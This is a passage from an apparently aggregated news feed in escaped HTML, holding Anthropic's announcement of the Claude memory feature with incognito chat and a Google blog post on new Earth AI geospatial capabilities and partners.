    &lt;p&gt;Weetile, dpieski, expilu, justsomescripts, StrangePeanut and 17 more&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/minio/minio/issues/21647"/><published>2025-10-23T16:46:57+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45684134</id><title>Claude Memory</title><updated>2025-10-23T17:37:14.609229+00:00</updated><content>&lt;doc fingerprint="777befbbffb2c0ea"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Bringing memory to Claude&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Update&lt;p&gt;Expanding to Pro and Max plans&lt;/p&gt;&lt;p&gt;Oct 23, 2025&lt;/p&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Whether you’re iterating on a strategy proposal, debugging an issue, or managing multiple projects, Claude picks up right where you left off. Like Team and Enterprise users, you get project-scoped memory (each project has its own separate memory), full control to view and edit what Claude remembers, and incognito chat for conversations that don’t save to memory.&lt;/p&gt;
    &lt;p&gt;Before this rollout, we ran extensive safety testing across sensitive wellbeing-related topics and edge cases—including whether memory could reinforce harmful patterns in conversations, lead to over-accommodation, and enable attempts to bypass our safeguards. Through this testing, we identified areas where Claude's responses needed refinement and made targeted adjustments to how memory functions. These iterations helped us build and improve the memory feature in a way that allows Claude to provide helpful and safe responses to users.&lt;/p&gt;
    &lt;p&gt;To get started, enable memory in Settings.&lt;/p&gt;
    &lt;p&gt;Today, we’re introducing memory to the Claude app, where Claude remembers you and your team’s projects and preferences, eliminating the need to re-explain context and keeping complex work moving forward.&lt;/p&gt;
    &lt;p&gt;Memory is fully optional, with granular user controls that help you manage what Claude remembers. We’re also introducing Incognito chats that don’t appear in your conversation history or save to memory.&lt;/p&gt;
    &lt;p&gt;Memory is rolling out to Team and Enterprise plan users starting today. Enterprise admins can choose whether to disable memory for their organization at any time. Incognito chat is available to all Claude users.&lt;/p&gt;
    &lt;head rend="h2"&gt;Memory built for work&lt;/head&gt;
    &lt;p&gt;With memory, Claude focuses on learning your professional context and work patterns to maximize productivity. It remembers your team’s processes, client needs, project details, and priorities. Sales teams keep client context across deals, product teams maintain specifications across sprints, and executives track initiatives without constantly rebuilding context.&lt;/p&gt;
    &lt;p&gt;If you use projects, Claude creates a separate memory for each project. This ensures that your product launch planning stays separate from client work, and confidential discussions remain separate from general operations. These project boundaries help you and your teams manage complex, concurrent initiatives without mixing unrelated details, serving as a safety guardrail that keeps sensitive conversations contained.&lt;/p&gt;
    &lt;p&gt;Claude uses a memory summary to capture all its memories in one place for you to view and edit. In your settings, you can see exactly what Claude remembers from your conversations, and update the summary at any time by chatting with Claude. Based on what you tell Claude to focus on or to ignore, Claude will adjust the memories it references.&lt;/p&gt;
    &lt;head rend="h2"&gt;Incognito chat&lt;/head&gt;
    &lt;p&gt;Sometimes you need Claude’s help without using or adding to memory. Incognito chat gives you a clean slate for conversations that you don’t want to preserve in memory. It is perfect for sensitive brainstorming, confidential strategy discussions, or when you simply want a fresh conversation without context from previous chats. Your regular memory and conversation history remain untouched. If you’re using memory on a Team or Enterprise plan, your standard data retention settings apply.&lt;/p&gt;
    &lt;head rend="h2"&gt;Starting with teams at work&lt;/head&gt;
    &lt;p&gt;Memory introduces new safety considerations and we've designed the feature to be useful in work settings, while avoiding sensitive conversations and topics. We're also taking a thoughtful phased approach to ensure these powerful capabilities are deployed responsibly, and will continue to evaluate and test how memory works across the different ways people use Claude before expanding availability.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;p&gt;To see memory in action, enable the feature in Settings, and let Claude generate memory with your past chats at initial set-up. Ask Claude questions like “what were we working on last week?” to see what Claude remembers across your existing chats and connected tools. If you would like to bring your memory details over from a different AI tool or export your memory from Claude for backup or migration, you can follow these instructions.&lt;/p&gt;
    &lt;p&gt;Great work builds over time. With memory, each conversation with Claude improves the next.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.anthropic.com/news/memory"/><published>2025-10-23T16:56:07+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45684155</id><title>Google Earth AI expanding access around the globe</title><updated>2025-10-23T17:37:14.390141+00:00</updated><content>&lt;doc fingerprint="3412e0dad1b67589"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;New updates and more access to Google Earth AI&lt;/head&gt;
    &lt;p&gt;When disasters strike, Google products like Search and Maps help billions of people make critical decisions to stay safe. Our flood forecasting information — now covering more than two billion people — provides life-saving forecasts before the most significant river floods. It's helped organizations like World Vision get drinking water and food to communities when they need it most. And during the devastating 2025 California wildfires, we provided crisis alerts with information from local authorities to 15 million people across Los Angeles while showing them where to find shelter in Google Maps. This is all made possible by our geospatial AI models, not only for floods and wildfires, but cyclones, air quality and many more.&lt;/p&gt;
    &lt;p&gt;We recently introduced Google Earth AI, bringing together these geospatial models to help tackle the planet's most critical needs. Earth AI is built on decades modeling the world, combined with state of the art predictive models and Gemini’s advanced reasoning, letting enterprises, cities and nonprofits achieve deeper understanding in minutes — efforts that previously required complex analytics and years of research.&lt;/p&gt;
    &lt;p&gt;Today, we’re advancing Earth AI’s innovations and capabilities, and expanding access around the globe. Here’s how:&lt;/p&gt;
    &lt;head rend="h2"&gt;Connecting the dots with Geospatial Reasoning&lt;/head&gt;
    &lt;p&gt;To solve a complex problem, you need to see the whole picture, not just one piece of it. That’s the idea behind Geospatial Reasoning, a framework powered by Gemini that now lets AI automatically connect different Earth AI models — like weather forecasts, population maps and satellite imagery — to answer complex questions.&lt;/p&gt;
    &lt;p&gt;Instead of just seeing where a storm might hit, our latest research demonstrates that analysts can use Geospatial Reasoning to identify which communities are most vulnerable and what infrastructure is at risk, all at once. For example, Geospatial Reasoning empowers the nonprofit GiveDirectly to respond to disasters by combining flood and population density information, helping them identify who needs direct aid most.&lt;/p&gt;
    &lt;p&gt;Sign up for consideration to become a Trusted Tester for Geospatial Reasoning. Social impact organizations can learn about future support for nonprofits through Google.org and our non-commercial access programs.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting deeper insights in Google Earth&lt;/head&gt;
    &lt;p&gt;Gemini capabilities in Google Earth enable analysts to quickly understand information about the world just by asking questions. Now, we’re bringing new Earth AI models to Gemini capabilities in Google Earth, letting users instantly find objects and discover patterns from satellite imagery.&lt;/p&gt;
    &lt;p&gt;For example, a water company can now spot where a river has dried up — which can help communities predict the risk of dust storms during a drought — and notify people in advance. Or, analysts can quickly identify where harmful algae is blooming in order to monitor drinking water supply, giving authorities time to issue warnings or shut down water utilities.&lt;/p&gt;
    &lt;p&gt;This experimental capability will be available in the U.S. in the coming weeks to Google Earth Professional and Professional Advanced users. And starting today, Google AI Pro and Ultra subscribers in the U.S. can access Gemini capabilities in Google Earth with higher limits.&lt;/p&gt;
    &lt;p&gt;Finding algae blooms within Google Earth imagery.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bringing Earth AI to Google Cloud&lt;/head&gt;
    &lt;p&gt;We’re making Earth AI Imagery, Population and Environment models directly available to Trusted Testers on Google Cloud. Businesses can now use their own data alongside our models and datasets, like Imagery Insights, to tackle specific challenges from environmental monitoring to disaster response.&lt;/p&gt;
    &lt;head rend="h2"&gt;Earth AI in Action&lt;/head&gt;
    &lt;p&gt;We’ve begun piloting Earth AI with thousands of organizations, including:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The World Health Organization Regional Office for Africa (WHO AFRO) is using Earth AI’s Population and Environment models, along with their own datasets, to understand and predict which areas in the Democratic Republic of Congo are at risk for cholera outbreaks. This information enables experts to help manage water, sanitation and vaccinations.&lt;/item&gt;
      &lt;item&gt;Satellite imagery providers like Planet and Airbus are using Earth AI models to analyze the billions of pixels they capture daily. Planet looks at historical satellite imagery to help customers map deforestation. Airbus uses Earth AI to help customers detect where vegetation is encroaching on power lines, so they can prevent outages.&lt;/item&gt;
      &lt;item&gt;Bellwether, a moonshot at Alphabet's X, is using Earth AI to provide hurricane predictions insights for global insurance broker McGill and Partners. This enables McGill's clients to pay claims faster so homeowners can start rebuilding sooner.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These updates will make it easier to take action with Earth AI. We're working with partners to train Earth AI models to reason about the physical world as fluently as LLMs reason about the digital one so that we can support those building solutions for their communities, solving problems in public health, crisis response and beyond.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/research/new-updates-and-more-access-to-google-earth-ai/"/><published>2025-10-23T16:58:04+00:00</published></entry></feed>